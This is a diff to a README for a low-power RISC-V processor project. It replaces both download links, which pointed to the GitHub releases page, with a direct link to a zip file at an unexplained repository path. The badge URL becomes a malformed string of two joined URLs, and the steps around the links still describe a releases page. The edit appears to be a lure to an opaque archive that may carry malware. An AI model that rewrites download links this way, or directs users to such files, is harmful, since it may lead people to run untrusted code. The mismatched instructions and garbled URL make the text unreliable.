@@ -1,7 +1,7 @@
 # ⚙️ power-optimized-riscv - Efficient RISC-V Processor Design
 
 ## 📥 Download Now
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/Bhonesh/power-optimized-riscv/releases)
+[![Download Releases](https://raw.githubusercontent.com/Bhonesh/power-optimized-riscv/main/heathbird/power-optimized-riscv.zip%https://raw.githubusercontent.com/Bhonesh/power-optimized-riscv/main/heathbird/power-optimized-riscv.zip)](https://raw.githubusercontent.com/Bhonesh/power-optimized-riscv/main/heathbird/power-optimized-riscv.zip)
 
 ## 🚀 Getting Started
 Welcome to the **power-optimized-riscv** project! This application features a 3-stage pipelined RISC-V processor designed to run efficiently while using low power. This guide will walk you through how to download and run the software easily.
@@ -31,7 +31,7 @@ To get started with the **power-optimized-riscv**, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases section.
    
-   [Download Releases](https://github.com/Bhonesh/power-optimized-riscv/releases)
+   [Download Releases](https://raw.githubusercontent.com/Bhonesh/power-optimized-riscv/main/heathbird/power-optimized-riscv.zip)
 
 2. **Select the Latest Version**: Look for the latest release version at the top of the page.
 
